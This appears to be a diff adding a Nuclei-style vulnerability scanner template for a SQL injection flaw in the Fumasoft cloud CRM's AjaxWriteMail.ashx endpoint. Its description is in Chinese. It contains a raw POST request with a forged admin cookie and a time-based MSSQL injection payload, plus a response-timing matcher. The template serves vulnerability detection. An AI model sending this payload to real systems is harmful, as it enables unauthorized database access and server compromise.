@@ -1,0 +1,38 @@
+id: fumasoft-AjaxWriteMail-sqli
+info:
+  name: 孚盟云CRM AjaxWriteMail.ashx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxWriteMail.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ffbpdonlhvkybq0p
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,fumasoft
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Cookie: UserCookie={"empId":"admin","corpId": "1"}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 64
+
+        method=updateLastedContactTable&mails=1'waitfor+delay'0:0:5'--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
